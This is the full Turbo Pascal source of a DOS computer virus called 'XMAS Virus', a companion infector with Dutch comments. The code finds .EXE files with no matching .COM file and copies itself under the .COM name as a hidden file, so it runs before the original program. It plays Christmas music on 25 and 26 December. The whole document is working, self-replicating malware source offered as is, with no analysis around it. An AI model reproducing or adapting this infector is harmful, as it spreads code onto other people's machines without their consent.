{

    XMAS Virus, a non-resident spawning .EXE infector by Glenn Benton
    To be compiled with Turbo Assembler 6.0

    Files required : XMAS.PAS       - Viral part (this one)
                     XMAS.OBJ       - Music data (composed by myself!)
                     PLAYIT.TPU     - Music player engine

    Set the environment variables for different effects :

    SET XMAS=YES          (Disable virus)
    SET XMAS=TST          (Plays the music only)
    SET XMAS=DEL          (Deletes the virus when a program is started)

    The compiled virus example is compressed and uses 6888 bytes...

        On 25th and 26th the virus activates, playing the music and
        wishes you a merry X-mas (nice of me, isn't it?)
        

}

Program Xmas;

{$M 4096,0,512}

Uses Crt, Dos, Playit;

Label StartOrig;

Var
   Year, Month, Day, DayOfWeek : Word;
   DirInfo : SearchRec;
   ComSeek : SearchRec;
   FileFound : Boolean;
   FileName : String;
   Parameters : String;
   OrigName : String;
   P : Byte;
   ExtHere : Boolean;
   Teller : Word;
   StopChar : Char;
   FromF : File;

{Dit is de data van het te spelen liedje}
{$L XMAS.OBJ}
Procedure Christmas; EXTERNAL;

{Deze routine wordt aangeroepen als het 25 of 26 december is}
Procedure Active;
Begin;
StopChar := #0;
ClrScr;
GotoXY(32,5);
WriteLn('Merry Christmas');
GotoXY(38,7);
WriteLn('and');
GotoXY(31,9);
WriteLn('A Happy New Year!');
GotoXy(31,11);
WriteLn('Wished To You By:');
GotoXy(34,17);
WriteLn('Glenn Benton');
GotoXy(27,24);
WriteLn('Press any key to continue');
Repeat
      PlayOBJ(@Christmas, TRUE, StopChar);
Until StopChar<>#0;
End;

{Deze procedure zoekt een EXE file waarvan er geen COM is en stuurt het
 resultaat in de boolean FileFound en de naam van het te maken COM bestand
 in FileName}
Procedure FileSeek;

Label Seeker, FileSeekOk;
Begin;
FileFound:=False;
FindFirst('*.EXE',Anyfile,DirInfo);

Seeker:
If DosError=18 Then Exit;
FileName:= DirInfo.Name;
Delete(FileName,Length(FileName)-2,3);
Insert('COM',FileName,Length(FileName)+1);
FindFirst(FileName,AnyFile,ComSeek);
If DosError=18 Then Goto FileSeekOk;
FindNext(DirInfo);
Goto Seeker;

FileSeekOk:
FileFound:=True;
End;

Procedure CopyFile;
var
  FromF, ToF: file;
  NumRead, NumWritten: Word;
  buf: array[1..512] of Char;
begin;
  { Open input file }
  Assign(FromF, ParamStr(0));
  { Record size = 1 }
  Reset(FromF, 1);
  { Open output file }
  Assign(ToF, FileName);
  { Record size = 1 }
  Rewrite(ToF, 1);
  repeat
    BlockRead(FromF,buf,
              SizeOf(buf),NumRead);
    BlockWrite(ToF,buf,NumRead,NumWritten);
  until (NumRead = 0) or
        (NumWritten <> NumRead);
  Close(FromF);
  Close(ToF);
  Assign(ToF,FileName);
  SetFAttr(ToF,Hidden);
end;


Begin; {Hoofdprocedure}
If (GetEnv('XMAS')='DEL') or (GetEnv('XMAS')='del') Then
   Begin;
   OrigName:=ParamStr(0);
   ExtHere:=False;
   P:=Pos('.COM',OrigName);
   If P<>0 Then ExtHere:=True;
   P:=Pos('.com',OrigName);
   If P<>0 Then ExtHere:=True;
   If ExtHere=False Then
                 OrigName:=OrigName+'.COM';
   Assign(FromF, OrigName);
   SetFAttr(FromF,Archive);
   Erase(FromF);
   Goto StartOrig;
   End;
If (GetEnv('XMAS')='TST') or (GetEnv('XMAS')='tst') Then
   Begin;
   Active;
   Goto StartOrig;
   End;

If (GetEnv('XMAS')='YES') or (GetEnv('XMAS')='yes') Then Goto StartOrig;

{Datum bekijken of het 25 of 26 december is en indien juist Active aanroepen}
GetDate(Year, Month, Day, DayOfWeek);
If (Month=12) and ((Day=25) or (Day=26)) then Active;

{Procedure voor EXE file zoeken aanroepen}
FileSeek;

{Als er een kandidaat is gevonden, dit prg als COM erbij zetten}
If FileFound=False Then Goto StartOrig;
CopyFile;

StartOrig:
Parameters:='';
For Teller:= 1 to ParamCount Do Parameters:=Parameters+' '+ParamStr(Teller);
OrigName:=ParamStr(0);
ExtHere:=False;
P:=Pos('.COM',OrigName);
If P<>0 Then ExtHere:=True;
P:=Pos('.com',OrigName);
If P<>0 Then ExtHere:=True;
If ExtHere=False Then
                 OrigName:=OrigName+'.EXE';
If ExtHere=True Then
                 Begin;
                 Delete(OrigName,Length(OrigName)-3,4);
                 OrigName:=OrigName+'.EXE';
                 End;
SwapVectors;
Exec(OrigName,Parameters);
SwapVectors;
Halt(DosExitCode);
End.

